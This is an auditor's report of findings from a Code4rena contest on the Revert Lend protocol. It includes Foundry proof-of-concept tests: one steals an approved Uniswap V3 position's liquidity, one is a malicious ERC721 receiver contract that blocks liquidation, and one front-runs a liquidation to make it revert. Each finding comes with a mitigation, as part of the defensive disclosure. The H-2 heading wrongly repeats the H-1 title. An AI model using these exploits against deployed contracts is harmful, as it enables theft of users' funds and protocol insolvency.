# Revert Lend
## Contest Summary

Code under review: [2024-03-revert-lend](https://github.com/code-423n4/2024-03-revert-lend) (3000 nSLOC)

Contest Page: [revert-lend-contest](https://code4rena.com/audits/2024-03-revert-lend)

Placement: #2/105+

## Findings Summary
| Severity | Title |
|------------|---------|
| [High-1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/141)  | V3Utils.execute() does not have caller validation, leading to stolen NFT positions from users  |
| [High-2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/54)  |Owner of a position can prevent liquidation due to the 'onERC721Received' callback|
| [Medium-1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/53)  |**(Solo Finding)** Incorrect liquidation fee calculation during underwater liquidation, disincentivizing liquidators to participate|
| [Medium-2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/110)  |**(Solo Finding)** AutoRange execution can be front-ran to avoid protocol fee, causing loss for protocol|
| [Medium-3](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/222)  |Malicious user can prevent liquidation via front-running and repaying 1 wei worth, causing `debtShares` check to revert|


# Findings

## [H-1] V3Utils.execute() does not have caller validation, leading to stolen NFT positions from users

### Vulnerability Details
When a user wants to use V3Utils, one of the flows stated by the protocol is as follows:

- TX1: User calls `NPM.approve(V3Utils, tokenId)`
- TX2: User calls `V3Utils.execute()` with specific instructions

> Note that this can't be done in one transaction since in TX1, the NPM has to be called directly by the EOA which owns the NFT, and thus the `V3Utils.execute()` would have to be called in a subsequent transaction.

Now this is usually a safe design pattern, but the issue is that `V3Utils.execute()` does not validate the owner of the UniV3 Position NFT that is being handled. This allows anybody to provide arbitrary instructions and call `V3Utils.execute()` once the NFT has been approved in TX1.

A malicious actor provide instructions that include the following:
1. `WhatToDo=WITHDRAW_AND_COLLECT_AND_SWAP`
2. `recipient= malicious_actor_address`
3. `liquidity=total_position_liquidity`

This would collect all liquidity from the position that was approved, and send it to the malicious attacker who didn't own the position.

### Impact
The entire liquidity of a specific UniswapV3 liquidity provision NFT can be stolen by a malicious actor, with zero cost.

### Proof of Concept
This foundry test demonstrates how an attacker can steal all the liquidity from a UniswapV3 position NFT that is approved to the V3Utils contract.

To run the PoC:
1. Add the following foundry test to `test/integration/V3Utils.t.sol`
2. Run the command `forge test --via-ir --mt test_backRunApprovals_toStealAllFunds -vv` in the terminal.

<details><summary>Foundry test</summary>

```solidity
function test_backRunApprovals_toStealAllFunds() external {
  address attacker = makeAddr("attacker");

  uint256 daiBefore = DAI.balanceOf(attacker);
  uint256 usdcBefore = USDC.balanceOf(attacker);
  (,,,,,,, uint128 liquidityBefore,,,,) = NPM.positions(TEST_NFT_3);

  console.log("Attacker's DAI Balance Before: %e", daiBefore);
  console.log("Attacker's USDC Balance Before: %e", usdcBefore);
  console.log("Position #%s's liquidity Before: %e", TEST_NFT_3, liquidityBefore);

  // Malicious instructions used by attacker:
  V3Utils.Instructions memory bad_inst = V3Utils.Instructions(
      V3Utils.WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP,
      address(USDC), 0, 0, 0, 0, "", 0, 0, "", type(uint128).max, type(uint128).max, 0, 0, 0,
      liquidityBefore, // Attacker chooses to withdraw 100% of the position's liquidity
      0,
      0,
      block.timestamp,
      attacker, // Recipient address of tokens
      address(0),
      false,
      "",
      ""
  );

  // User approves V3Utils, planning to execute next
  vm.prank(TEST_NFT_3_ACCOUNT);
  NPM.approve(address(v3utils), TEST_NFT_3);
 
  console.log("
--ATTACK OCCURS--
");
  // User's approval gets back-ran
  vm.prank(attacker);
  v3utils.execute(TEST_NFT_3, bad_inst);
 
  uint256 daiAfter = DAI.balanceOf(attacker);
  uint256 usdcAfter = USDC.balanceOf(attacker);
  (,,,,,,, uint128 liquidityAfter,,,,) = NPM.positions(TEST_NFT_3);

  console.log("Attacker's DAI Balance After: %e", daiAfter);
  console.log("Attacker's USDC Balance After: %e", usdcAfter);
  console.log("Position #%s's liquidity After: %e", TEST_NFT_3, liquidityAfter);
}
```
</details>

Console output:
```
Ran 1 test for test/integration/V3Utils.t.sol:V3UtilsIntegrationTest
[PASS] test_backRunApprovals_toStealAllFunds() (gas: 351245)
Logs:
Attacker's DAI Balance Before: 0e0
Attacker's USDC Balance Before: 0e0
Position #4660's liquidity Before: 1.2922419498089422291e19

--ATTACK OCCURS--

Attacker's DAI Balance After: 4.2205702812280886591005e22
Attacker's USDC Balance After: 3.5931648355e10
Position #4660's liquidity After: 0e0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17s

Ran 1 test suite in 1.17s: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Tools Used
Manual Review

### Recommended Mitigation Steps
Add a check to ensure that only the owner of the position can call `V3Utils.execute`.

Note that the fix also checks for the case where a user may have transferred the token into the `V3Utils`, since in that case it is fine that `msg.sender != tokenOwner` since `tokenOwner` would then be the V3Utils contract itself.

```diff
function execute(uint256 tokenId, Instructions memory instructions) public returns (uint256 newTokenId) {
     
+       address tokenOwner = nonfungiblePositionManager.ownerOf(tokenId);
+       if (tokenOwner != msg.sender && tokenOwner != address(this)) {
+           revert Unauthorized();
+       }
 
  /* REST OF CODE */
}
```

## [H-2] V3Utils.execute() does not have caller validation, leading to stolen NFT positions from users
### Vulnerability Description
When liquidating a position, _cleanUpLoan() is called on the loan. This attempts to send the uniswap LP position back to the user via the following line:
```solidity
nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);
```
This `safeTransferFrom` function call invokes the `onERC721Received` function on the owner's contract. The transaction will only succeed if the owner's contract returns the function selector of the standard `onERC721Received` function. However, the owner can design the function to return an invalid value, and this would lead to the `safeTransferFrom` reverting, thus being unable to liquidate the user.

### Impact
This leads to bad debt accrual in the protocol which cannot be prevented, and eventually insolvency.

### Proof of Concept
Here is a foundry test that proves this vulnerability.

To run the PoC:
1. Copy the attacker contract into `test/integration/V3Vault.t.sol`
2. In the same file, copy the contents of the 'foundry test' dropdown into the `V3VaultIntegrationTest` contract
3. In the terminal, enter `forge test --via-ir --mt test_preventLiquidation -vv`

<details>
<summary>Attacker Contract</summary>

```solidity
contract MaliciousBorrower {

address public vault;

constructor(address _vault) {
    vault = _vault;
}
function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {

    // Does not accept ERC721 tokens from the vault. This causes liquidation to revert
    if (from == vault) return bytes4(0xdeadbeef);

    else return msg.sig;
}
}
```
</details>

<details><summary>Foundry test</summary>

```solidity
function test_preventLiquidation() external {
   
    // Create malicious borrower, and setup a loan
    address maliciousBorrower = address(new MaliciousBorrower(address(vault)));
    custom_setupBasicLoan(true, maliciousBorrower);

    // assert: debt is equal to collateral value, so position is not liquidatable
    (uint256 debt,,uint256 collateralValue, uint256 liquidationCost, uint256 liquidationValue) = vault.loanInfo(TEST_NFT);
    assertEq(debt, collateralValue);

    // collateral DAI value change -100%
    vm.mockCall(
        CHAINLINK_DAI_USD,
        abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
        abi.encode(uint80(0), int256(0), block.timestamp, block.timestamp, uint80(0))
    );
   
    // ignore difference
    oracle.setMaxPoolPriceDifference(10001);

    // assert that debt is greater than collateral value (position is liquidatable now)
    (debt, , collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);
    assertGt(debt, collateralValue);

    (uint256 debtShares) = vault.loans(TEST_NFT);

    vm.startPrank(WHALE_ACCOUNT);
    USDC.approve(address(vault), liquidationCost);

    // This fails due to malicious owner. So under-collateralised position can't be liquidated. DoS!
    vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
    vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));
}

function custom_setupBasicLoan(bool borrowMax, address borrower) internal {
    // lend 10 USDC
    _deposit(10000000, WHALE_ACCOUNT); 

    // Send the test NFT to borrower account
    vm.prank(TEST_NFT_ACCOUNT);
    NPM.transferFrom(TEST_NFT_ACCOUNT, borrower, TEST_NFT);

    uint256 tokenId = TEST_NFT;

    // borrower adds collateral
    vm.startPrank(borrower);
    NPM.approve(address(vault), tokenId);
    vault.create(tokenId, borrower);

    (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);

    // borrower borrows assets, backed by their univ3 position
    if (borrowMax) {
        // borrow max
        vault.borrow(tokenId, collateralValue);
    }
    vm.stopPrank();
}
```
</details>

<details><summary>Terminal output</summary>

```bash
Ran 1 test for test/integration/V3Vault.t.sol:V3VaultIntegrationTest
[PASS] test_preventLiquidation() (gas: 1765928)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 473.56ms
```

</details>

### Tools Used
Manual Review

### Recommended Mitigation Steps
One solution would be to approve the NFT to the owner and provide a way (via the front-end or another contract) for them to redeem the NFT back later on. This is a 'pull over push' approach and ensures that the liquidation will occur.

Example:
```diff
function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)
    internal
{
    _removeTokenFromOwner(owner, tokenId);
    _updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0);
    delete loans[tokenId];
-        nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);
+       nonfungiblePositionManager.approve(owner, tokenId);
    emit Remove(tokenId, owner);
}
```

## [M-1] Incorrect liquidation fee calculation during underwater liquidation, disincentivizing liquidators to participate

### Vulnerability Description
As stated in the [Revert Lend Whitepaper](https://github.com/revert-finance/lend-whitepaper/blob/main/Revert_Lend-wp.pdf), the liquidation fee for underwater positions is supposed to be 10% of the debt.

However the code within `V3Vault::_calculateLiquidation` (shown below) calculates the liquidation fee as 10% of the `fullValue` rather than 10% of the `debt`.
```solidity
  } else {
      // all position value
      liquidationValue = fullValue;


      uint256 penaltyValue = fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32;
      liquidatorCost = penaltyValue;
      reserveCost = debt - penaltyValue;
  }
```
>Note: `fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32;` is equivalent to `fullValue * 90%`.

A permalink to the code snippet is [here](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1112-L1119)

### Impact
As the `fullValue` decreases below `debt` (since the position is underwater), liquidators are less-and-less incentivised to liquidate the position. This is because as `fullValue` decreases, the liquidation fee (10% of `fullValue`) also decreases.

This goes against the protocol's intention (stated in the whitepaper) that the liquidation fee will be fixed at 10% of the debt for underwater positions, breaking core protocol functionality.

### Proof of Concept
**Code snippet from `V3Vault._calculateLiquidation`:**
https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1112-L1119


### Recommended Mitigation Steps
Ensure that the liquidation fee is equal to 10% of the debt.
Make the following changes in `V3Vault::_calculateLiquidation()`:

```diff
else {
-// all position value
-liquidationValue = fullValue;


-uint256 penaltyValue = fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32;
-liquidatorCost = penaltyValue;
-reserveCost = debt - penaltyValue;

+uint256 penalty = debt * (MAX_LIQUIDATION_PENALTY_X32) / Q32; //[10% of debt]
+liquidatorCost = fullValue - penalty;
+liquidationValue = fullValue;
+reserveCost = debt - liquidatorCost; // Remaining to pay.
}  
```

## [M-2] AutoRange execution can be front-ran to avoid protocol fee, causing loss for protocol

### Vulnerability Description
When users configure their NFT within the `AutoRange` contract, they have 2 options for fee-handling:
1. Protocol takes 0.15% of the entire position size.
2. Protocol takes a higher fee of 2%, but only from the position's collected fees.
The user sets `PositionConfig.onlyFees=false` for the first option, and `onlyFees=true` for the second option.

When an operator calls the `AutoRange.execute()` function, they set the reward parameter `rewardX64` based on the user's `PositionConfig`.

However the execution can be front-ran by the user, and they can change the `onlyFees` boolean which changes the fee handling logic, while the `rewardX64` parameter set by the operator is unchanged.

The user can exploit this to their advantage by initially setting `onlyFees` to false, so that the operator will call the function with only 0.15% reward percentage. But when the operator sends their transaction, the user front-runs it by changing `onlyFees` to true. Now, the protocol only gets 0.15% of the fees collected when they initially intended to collect 0.15% of the entire position.

### Impact
The cost of executing the swap is likely to exceed the fees obtained (since expected fee is 0.15% of entire position, but only 0.15% of fees are obtained).
This leads to loss of funds for the protocol.

>Note: this has been submitted as only a medium severity issue since the protocol's off-chain operator logic can simply blacklist such users once they have performed the exploit.

### Proof of Concept
**The rewardX64 parameter:**
https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/transformers/AutoRange.sol#L62

**Docs regarding fee source:**
https://docs.revert.finance/revert/auto-range#selecting-a-fee-source

### Tools Used
Manual Review

### Recommended Mitigation Steps
Let the operator pass in 2 different values for rewardX64, where each one corresponds to a different value of `onlyFees`. This way, the `rewardX64` parameter passed in will not be inconsistent with the executed logic.


## [M-3] Repayments and liquidations can be forced to revert by an attacker that repays miniscule amount of shares

### Vulnerability Details

When liquidating a position, the following check occurs, to ensure that the `params.debtShares` passed in by the liquidator is equal to the actual `debtShares` of the loan:
```solidity
uint256 debtShares = loans[params.tokenId].debtShares;

if (debtShares != params.debtShares) {
    revert DebtChanged();
}
```

A malicious position owner can simply frontrun this liquidation transaction with their own transaction where they repay 1 wei of the loan, and this reduces `.debtShares` by 1 wei. The position is still undercollateralised, so should be liquidated.

But now that `debtShares` has changed, the above check will fail in the liquidator's transaction, and the liquidation will revert.

> In addition, here is a very similar finding in the [C4 Venus contest (May 2023)](https://github.com/code-423n4/2023-05-venus-findings/issues/255)


### Impact
This is a denial of service for liquidators and can lead to bad debt accrual in the vault + also wasted gas for liquidators. It only costs 1 wei + gas fee for the attacker to perform the attack, so it is cheap.

### Proof of Concept
In `test/integration/V3Vault.t.sol`, replace `_testLiquidation()` with the function in the provided dropdown.
> Note: the only real change made was adding the repayment logic right before the liquidation, to simulate frontrunning the liquidation's transaction.

Then to run the PoC, enter in the terminal `forge test --via-ir  --mt testLiquidationTimeBased -vv`

<details><summary>Updated version of _testLiquidation()</summary>

```solidity
function _testLiquidation(LiquidationType lType) internal {
        _setupBasicLoan(true);

        (, uint256 fullValue, uint256 collateralValue,,) = vault.loanInfo(TEST_NFT);
        assertEq(collateralValue, 8847206);
        assertEq(fullValue, 9830229);

        // debt is equal collateral value
        (uint256 debt,,, uint256 liquidationCost, uint256 liquidationValue) = vault.loanInfo(TEST_NFT);
        assertEq(debt, collateralValue);
        assertEq(liquidationCost, 0);
        assertEq(liquidationValue, 0);

        if (lType == LiquidationType.TimeBased) {
            // wait 7 day - interest growing
            vm.warp(block.timestamp + 7 days);
        } else if (lType == LiquidationType.ValueBased) {
            // collateral DAI value change -100%
            vm.mockCall(
                CHAINLINK_DAI_USD,
                abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
                abi.encode(uint80(0), int256(0), block.timestamp, block.timestamp, uint80(0))
            );
        } else {
            vault.setTokenConfig(address(DAI), uint32(Q32 * 2 / 10), type(uint32).max); // 20% collateral factor
        }

        if (lType == LiquidationType.ValueBased) {
            // should revert because oracle and pool price are different
            vm.expectRevert(IErrors.PriceDifferenceExceeded.selector);
            (debt, fullValue, collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);

            // ignore difference - now it will work
            oracle.setMaxPoolPriceDifference(10001);
        }

        // debt is greater than collateral value
        (debt, fullValue, collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);

        // debt only grows in time based scenario
        assertEq(
            debt,
            lType == LiquidationType.TimeBased ? 8869647 : (lType == LiquidationType.ValueBased ? 8847206 : 8847206)
        );

        // collateral value is lower in non time based scenario
        assertEq(
            collateralValue,
            lType == LiquidationType.TimeBased ? 8847206 : (lType == LiquidationType.ValueBased ? 8492999 : 1966045)
        );
        assertEq(
            fullValue,
            lType == LiquidationType.TimeBased ? 9830229 : (lType == LiquidationType.ValueBased ? 9436666 : 9830229)
        );

        assertGt(debt, collateralValue);
        assertEq(
            liquidationCost,
            lType == LiquidationType.TimeBased ? 8869647 : (lType == LiquidationType.ValueBased ? 8492999 : 8847206)
        );
        assertEq(
            liquidationValue,
            lType == LiquidationType.TimeBased ? 9226564 : (lType == LiquidationType.ValueBased ? 9436666 : 9729910)
        );

        vm.prank(WHALE_ACCOUNT);
        USDC.approve(address(vault), liquidationCost - 1);

        (uint256 debtShares) = vault.loans(TEST_NFT);

        vm.prank(WHALE_ACCOUNT);
        vm.expectRevert("ERC20: transfer amount exceeds allowance");
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));

        vm.prank(WHALE_ACCOUNT);
        USDC.approve(address(vault), liquidationCost);

        uint256 daiBalance = DAI.balanceOf(WHALE_ACCOUNT);
        uint256 usdcBalance = USDC.balanceOf(WHALE_ACCOUNT);

        // Frontrunning!
        vm.startPrank(TEST_NFT_ACCOUNT);
        USDC.approve(address(vault), type(uint256).max);
        vault.repay(TEST_NFT, 1, true);
        vm.stopPrank();

        vm.prank(WHALE_ACCOUNT);
        vm.expectRevert(abi.encodeWithSignature("DebtChanged()"));
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));
    }
```
</details>

### Tools Used
Manual Review

### Recommended Mitigation Steps
Consider: Instead of reverting the transaction, just use the actual value of `debtShares` within the loan struct and continue with the liquidation of the under-collateralised position.




